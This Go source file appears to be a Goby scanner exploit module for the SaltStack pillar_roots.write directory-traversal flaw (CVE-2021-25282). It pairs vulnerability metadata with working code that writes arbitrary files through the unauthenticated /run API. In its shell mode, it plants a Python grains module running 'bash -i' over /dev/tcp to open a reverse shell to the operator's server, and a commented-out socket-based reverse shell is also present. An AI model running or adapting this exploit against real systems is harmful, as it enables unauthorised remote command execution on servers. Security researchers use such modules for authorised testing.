package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"log"
	"net/url"
	"regexp"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "SaltStack pillar_roots file File Write (CVE-2021-25282)",
    "Description": "<p>Built on python, Salt uses simple and human-readable YAML combined with event-driven automation to deploy and configure complex IT systems. </p><p>An issue was discovered in through SaltStack Salt before 3002.5. The salt.wheel.pillar_roots.write method is vulnerable to directory traversal.</p>",
    "Product": "SaltStack",
    "Homepage": "https://github.com/saltstack/salt",
    "DisclosureDate": "2021-11-02",
    "Author": "",
    "FofaQuery": "header=\"application/json\" && header=\"CherryPy\" && body=\"clients\"",
    "GobyQuery": "header=\"application/json\" && header=\"CherryPy\" && body=\"clients\"",
    "Level": "3",
    "Impact": "<p>An issue was discovered in through SaltStack Salt before 3002.5. The salt.wheel.pillar_roots.write method is vulnerable to directory traversal.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://github.com/saltstack/salt\">https://github.com/saltstack/salt</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.2. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://packetstormsecurity.com/files/162058/SaltStack-Salt-API-Unauthenticated-Remote-Command-Execution.html",
        "https://github.com/saltstack/salt/releases",
        "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/7GRVZ5WAEI3XFN2BDTL6DDXFS5HYSDVB/",
        "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/FUGLOJ6NXLCIFRD2JTXBYQEMAEF2B6XH/",
        "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/YOGNT2XWPOYV7YT75DN7PS4GIYWFKOK5/",
        "https://saltproject.io/security_announcements/active-saltstack-cve-release-2021-feb-25/",
        "https://security.gentoo.org/glsa/202103-01",
        "https://nvd.nist.gov/vuln/detail/CVE-2021-25282",
        "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-25282",
        "https://saltproject.io/security_announcements/active-saltstack-cve-release-2021-feb-25/",
        "https://github.com/Immersive-Labs-Sec/CVE-2021-25281/blob/main/cve-2021-25281.py"
    ],
    "Translation": {
        "CN": {
            "Name": "SaltStack 系统 pillar_roots 文件 文件写入漏洞(CVE-2021-25282)",
            "Product": "SaltStack",
            "VulType": [
                "文件创建"
            ],
            "Tags": [
                "文件创建"
            ],
            "Description": "<p>Salt 是一个基于 Python 构建，使用简单易读的 YAML 结合事件驱动的自动化来部署和配置复杂的 IT 系统。</p><p>在 3002.5 之前通过 SaltStack Salt 发现了一个问题。 salt.wheel.pillar_roots.write 方法容易受到目录遍历以及文件写入漏洞攻击。。</p>",
            "Impact": "<p>在 3002.5 之前通过 SaltStack Salt 发现了一个问题。 salt.wheel.pillar_roots.write 方法容易受到目录遍历以及文件写入漏洞攻击。</p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://github.com/saltstack/salt\">https://github.com/saltstack/salt</a></p><p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。<br>2、如非必要，禁止公网访问该系统。</p>"
        },
        "EN": {
            "Name": "SaltStack pillar_roots file File Write (CVE-2021-25282)",
            "Product": "SaltStack",
            "VulType": [
                "File Creation"
            ],
            "Tags": [
                "File Creation"
            ],
            "Description": "<p>Built on python, Salt uses simple and human-readable YAML combined with event-driven automation to deploy and configure complex IT systems. </p><p>An issue was discovered in through SaltStack Salt before 3002.5. The salt.wheel.pillar_roots.write method is vulnerable to directory traversal.</p>",
            "Impact": "<p>An issue was discovered in through SaltStack Salt before 3002.5. The salt.wheel.pillar_roots.write method is vulnerable to directory traversal.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://github.com/saltstack/salt\">https://github.com/saltstack/salt</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.<br>2. If not necessary, prohibit public network access to the system.</p>"
        }
    },
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "path",
            "type": "input",
            "value": "../../../../../../../../../../tmp/test",
            "show": "attackType=write_file"
        },
        {
            "name": "data",
            "type": "input",
            "value": "file content",
            "show": "attackType=write_file"
        },
        {
            "name": "attackType",
            "type": "select",
            "value": "goby_shell_linux,write_file",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Creation"
    ],
    "VulType": [
        "File Creation"
    ],
    "CVEIDs": [
        "CVE-2021-25282"
    ],
    "CNNVD": [
        "CNNVD-202102-1695"
    ],
    "CNVD": [
        "CNVD-2021-18371"
    ],
    "CVSSScore": "9.6",
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10207"
}`

	writeFile := func(u *httpclient.FixUrl, path string, data string) bool {
		cfg := httpclient.NewGetRequestConfig("/run")
		cfg.VerifyTls = false
		if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
			if resp.StatusCode == 200 && strings.Contains(resp.Header.Get("Content-Type"), "application/json") && strings.Contains(resp.RawBody, "wheel_async") && strings.Contains(resp.RawBody, "runner_async") {
				cfg2 := httpclient.NewPostRequestConfig("/run")
				cfg2.VerifyTls = false

				cfg2.Header.Store("Content-Type", "application/json")
				data = strings.ReplaceAll(strings.ReplaceAll(data, `\`, `\\`), `"`, `\"`)
				data = strings.ReplaceAll(data, "\n", `\n`)
				cfg2.Data = fmt.Sprintf(`{"eauth":"auto","client":"wheel_async","fun":"pillar_roots.write","data":"%s","path":"%s"}`, data, path)
				if resp2, err := httpclient.DoHttpRequest(u, cfg2); err == nil {
					return resp2.StatusCode == 200 && strings.Contains(resp2.Header.Get("Content-Type"), "application/json") && regexp.MustCompile(`salt/wheel/\d+`).MatchString(resp2.RawBody)
				}
			}
		}

		return false
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			randHex := goutils.RandomHexString(5)
			path := "../../../../../../../../../tmp/" + randHex
			data := randHex
			return writeFile(u, path, data)
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := ss.Params["attackType"].(string)
			if attackType == "goby_shell_linux" {
				waitSessionCh := make(chan string)
				if rp, err := godclient.WaitSession("reverse_linux", waitSessionCh); err != nil || len(rp) == 0 {
					log.Println("[WARNING] godclient bind failed", err)
					expResult.Output = "godclient bind failed"
					return expResult
				} else {
					randHex := goutils.RandomHexString(5)
					path := "../../../../../../../../../var/cache/salt/master/extmods/grains/" + randHex + ".py"

					// 使用这个反弹shell方法，godserver的监听端口有接收到连接，但没有返回shell
					//data := fmt.Sprintf("import socket,subprocess,os\n" +
					//	"def foo%s():\n" +
					//	`    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")` + "\n" +
					//	"    return {}\n" + "foo%s()", randHex, godclient.GetGodServerHost(), rp, randHex)

					data := fmt.Sprintf("import subprocess\n"+
						"def foo%s():\n"+
						`    subprocess.Popen(['bash', '-c', 'bash -i &>/dev/tcp/%s/%s <&1 &'])`+"\n"+
						"    return {}\n"+"foo%s()", randHex, godclient.GetGodServerHost(), rp, randHex)

					writeFile(expResult.HostInfo, path, data)

					select {
					case webConsleID := <-waitSessionCh:
						log.Println("[DEBUG] session created at:", webConsleID)
						if u, err := url.Parse(webConsleID); err == nil {
							expResult.Success = true
							expResult.OutputType = "html"
							sid := strings.Join(u.Query()["id"], "")
							expResult.Output = `<br/><a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a><br/>` +
								fmt.Sprintf("<p>It's recommended to remove these webshell script in target server: /var/cache/salt/master/extmods/grains/%s.py and /var/cache/salt/master/extmods/grains/__pycache__/%s.*.pyc</p>", randHex, randHex)
							return expResult
						}
					case <-time.After(time.Second * 25):
					}
				}
				expResult.Output = "Writing files may fail or server doesn't invoke webshell script, it's recommended to try two or three times."
				return expResult

			} else if attackType == "write_file" {
				path := ss.Params["path"].(string)
				data := ss.Params["data"].(string)

				res := writeFile(expResult.HostInfo, path, data)
				if res {
					expResult.Success = true
					expResult.Output = "Writing file may fail, it's recommended to try two or three times."
				}

			}

			return expResult
		},
	))
}